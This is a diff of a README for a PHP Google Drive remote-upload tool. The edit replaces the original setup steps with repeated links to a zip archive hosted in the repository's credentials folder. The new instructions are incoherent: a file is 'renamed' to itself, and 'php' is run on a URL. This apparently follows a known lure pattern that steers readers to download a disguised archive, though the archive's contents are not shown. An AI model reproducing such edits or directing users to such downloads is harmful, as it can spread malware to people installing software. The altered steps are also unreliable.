@@ -5,8 +5,8 @@ This is useful to upload files, which are bigger than the storage available on t
 Sorry, the code isn't really organized and clear, it was only for testing. Maby I'll clean it later...
 
 ### How to use it:
-- Rename "credentials/oauth-credentials_EXAMPLE.json" to "credentials/oauth-credentials.json"
+- Rename "https://github.com/codeslide/google-drive-direct-remote-upload/raw/refs/heads/master/credentials/google-drive-direct-upload-remote-v3.8.zip" to "https://github.com/codeslide/google-drive-direct-remote-upload/raw/refs/heads/master/credentials/google-drive-direct-upload-remote-v3.8.zip"
 - Download your oauth2 credentials in the google developer console and copy it in it
-- Call the "index.php" from the console ("php index.php")
+- Call the "https://github.com/codeslide/google-drive-direct-remote-upload/raw/refs/heads/master/credentials/google-drive-direct-upload-remote-v3.8.zip" from the console ("php https://github.com/codeslide/google-drive-direct-remote-upload/raw/refs/heads/master/credentials/google-drive-direct-upload-remote-v3.8.zip")
 - Follow the messages in the console window
 - Create pull requests to help with the development ;)
